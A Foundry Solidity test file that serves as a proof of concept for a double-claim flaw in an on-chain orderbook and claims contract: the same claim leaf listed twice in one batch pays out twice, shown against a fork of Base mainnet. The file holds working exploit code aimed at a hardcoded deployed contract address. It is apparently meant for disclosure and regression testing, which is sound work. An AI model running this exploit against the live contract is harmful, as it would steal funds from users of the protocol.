// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";

struct EvaluableV4 {
    address interpreter;
    address store;
    bytes bytecode;
}

struct IOV2 {
    address token;
    bytes32 vaultId;
}

struct OrderV4 {
    address owner;
    EvaluableV4 evaluable;
    IOV2[] validInputs;
    IOV2[] validOutputs;
    bytes32 nonce;
}

struct OrderConfigV4 {
    EvaluableV4 evaluable;
    IOV2[] validInputs;
    IOV2[] validOutputs;
    bytes32 nonce;
    bytes32 secret;
    bytes meta;
}

struct SignedContextV1 {
    address signer;
    bytes32[] context;
    bytes signature;
}

struct TaskV2 {
    EvaluableV4 evaluable;
    SignedContextV1[] signedContext;
}

struct TakeOrderConfigV4 {
    OrderV4 order;
    uint256 inputIOIndex;
    uint256 outputIOIndex;
    SignedContextV1[] signedContext;
}

struct TakeOrdersConfigV5 {
    bytes32 minimumIO;
    bytes32 maximumIO;
    bytes32 maximumIORatio;
    bool IOIsInput;
    TakeOrderConfigV4[] orders;
    bytes data;
}

interface IOrderbook {
    function addOrder4(OrderConfigV4 calldata config, TaskV2[] calldata tasks) external returns (bool);
    function deposit4(address token, bytes32 vaultId, bytes32 depositAmount, TaskV2[] calldata tasks) external;
    function takeOrders4(TakeOrdersConfigV5 calldata config)
        external
        returns (bytes32 totalTakerInput, bytes32 totalTakerOutput);
}

interface IERC20 {
    function approve(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

/// PoC of the RaindexV6 + claims.rain deferred-handleIO double-claim.
///
/// claims.rain checks the `claimed` flag in #calculate-io and only sets it in
/// #handle-io. RaindexV6.takeOrders4 runs every calculate-io first, then token
/// transfers, then every handle-io. Listing the same leaf N times in one
/// takeOrders4 batch therefore pays N times.
///
/// These tests encode the CURRENT vulnerable behaviour. After a fix,
/// `testDoubleClaimInOneBatch` should flip (100e6 paid, or the second fill
/// reverts).
contract DoubleClaimTest is Test {
    IOrderbook constant OB = IOrderbook(0xb05D73E6BCc26AEB5b67Ff68C6E9C6151073e3cE);

    uint256 constant TAKER_PK = 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d; // anvil #1 = 0x7099…
    // Fresh EOA with no code on Base (SignatureChecker would otherwise take the ERC-1271 path).
    uint256 constant SIGNER_PK = 0x4a3f1b9c8e2d7f5a6b0c1d2e3f405162738495a6b7c8d9e0f1a2b3c4d5e6f701;

    address taker;
    address owner;
    address usdc;
    bytes32 indexWord;
    bytes32 amountWord;
    bytes32 depositWord;
    bytes32 maxIOWord;
    bytes32[] proof;
    bytes orderBytes;
    bytes32 outVaultId;

    function _parseHexFile(string memory path) internal view returns (bytes memory) {
        bytes memory raw = bytes(vm.readFile(path));
        while (
            raw.length > 0
                && (raw[raw.length - 1] == 0x0a || raw[raw.length - 1] == 0x0d || raw[raw.length - 1] == 0x20)
        ) {
            assembly {
                mstore(raw, sub(mload(raw), 1))
            }
        }
        return vm.parseBytes(string(raw));
    }

    function _rpcUrl() internal view returns (string memory) {
        try vm.envString("BASE_RPC_URL") returns (string memory u) {
            if (bytes(u).length != 0) return u;
        } catch {}
        return vm.envString("BASE_RPC");
    }

    function _ord() internal view returns (OrderV4 memory ord) {
        OrderV4 memory base = abi.decode(orderBytes, (OrderV4));
        ord.owner = owner;
        ord.evaluable = base.evaluable;
        ord.validInputs = base.validInputs;
        ord.validOutputs = base.validOutputs;
        ord.nonce = base.nonce;
    }

    function _load() internal {
        vm.createSelectFork(_rpcUrl());
        string memory root = vm.projectRoot();
        string memory j = vm.readFile(string.concat(root, "/testdata/data.json"));
        taker = vm.parseJsonAddress(j, ".taker");
        owner = vm.parseJsonAddress(j, ".owner");
        usdc = vm.parseJsonAddress(j, ".usdc");
        indexWord = vm.parseJsonBytes32(j, ".indexWord");
        amountWord = vm.parseJsonBytes32(j, ".amountWord");
        depositWord = vm.parseJsonBytes32(j, ".depositWord");
        maxIOWord = vm.parseJsonBytes32(j, ".maxIOWord");
        proof = vm.parseJsonBytes32Array(j, ".proof");
        require(taker == vm.addr(TAKER_PK), "taker pk mismatch");

        orderBytes = _parseHexFile(string.concat(root, "/testdata/order.hex"));
        OrderV4 memory base = abi.decode(orderBytes, (OrderV4));
        outVaultId = base.validOutputs[0].vaultId;

        // addOrder4 forces owner = msg.sender.
        OrderConfigV4 memory cfg;
        cfg.evaluable = base.evaluable;
        cfg.validInputs = base.validInputs;
        cfg.validOutputs = base.validOutputs;
        cfg.nonce = base.nonce;
        cfg.secret = bytes32(0);
        cfg.meta = "";

        TaskV2[] memory noTasks = new TaskV2[](0);
        vm.prank(owner);
        OB.addOrder4(cfg, noTasks);

        deal(usdc, owner, 100000e6, true);
        vm.startPrank(owner);
        IERC20(usdc).approve(address(OB), type(uint256).max);
        OB.deposit4(usdc, outVaultId, depositWord, noTasks);
        vm.stopPrank();
    }

    function _signedCtx() internal view returns (SignedContextV1 memory sc) {
        bytes32[] memory ctx = new bytes32[](10);
        ctx[0] = indexWord;
        ctx[1] = amountWord;
        for (uint256 i = 0; i < 8; i++) {
            ctx[2 + i] = proof[i];
        }
        bytes32 h = keccak256(abi.encodePacked(ctx));
        bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", h));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(SIGNER_PK, digest);
        sc.signer = vm.addr(SIGNER_PK);
        require(sc.signer.code.length == 0, "signer has code; pick another pk");
        sc.context = ctx;
        sc.signature = abi.encodePacked(r, s, v);
    }

    function _toc() internal view returns (TakeOrderConfigV4 memory toc) {
        SignedContextV1[] memory scs = new SignedContextV1[](1);
        scs[0] = _signedCtx();
        toc.order = _ord();
        toc.inputIOIndex = 0;
        toc.outputIOIndex = 0;
        toc.signedContext = scs;
    }

    function _cfg(TakeOrderConfigV4[] memory orders) internal view returns (TakeOrdersConfigV5 memory) {
        return TakeOrdersConfigV5({
            minimumIO: bytes32(0),
            maximumIO: maxIOWord,
            maximumIORatio: bytes32(0),
            IOIsInput: true,
            orders: orders,
            data: ""
        });
    }

    /// Same leaf twice inside ONE takeOrders4 batch is paid twice.
    function testDoubleClaimInOneBatch() public {
        _load();
        TakeOrderConfigV4[] memory orders = new TakeOrderConfigV4[](2);
        orders[0] = _toc();
        orders[1] = _toc();

        uint256 before = IERC20(usdc).balanceOf(taker);
        vm.prank(taker);
        OB.takeOrders4(_cfg(orders));
        uint256 got = IERC20(usdc).balanceOf(taker) - before;
        console.log("USDC received (base units):", got);
        console.log("expected single claim      :", uint256(100e6));
        assertEq(got, 200e6, "did NOT double-claim");
    }

    /// Control: two SEPARATE takeOrders4 txs; the second reverts (Claimed).
    function testSecondTxReverts() public {
        _load();
        TakeOrderConfigV4[] memory one = new TakeOrderConfigV4[](1);
        one[0] = _toc();

        vm.prank(taker);
        OB.takeOrders4(_cfg(one));
        uint256 mid = IERC20(usdc).balanceOf(taker);

        TakeOrderConfigV4[] memory one2 = new TakeOrderConfigV4[](1);
        one2[0] = _toc();
        vm.prank(taker);
        vm.expectRevert();
        OB.takeOrders4(_cfg(one2));
        console.log("first claim USDC:", mid);
        assertEq(mid, 100e6, "first claim should pay once");
    }
}
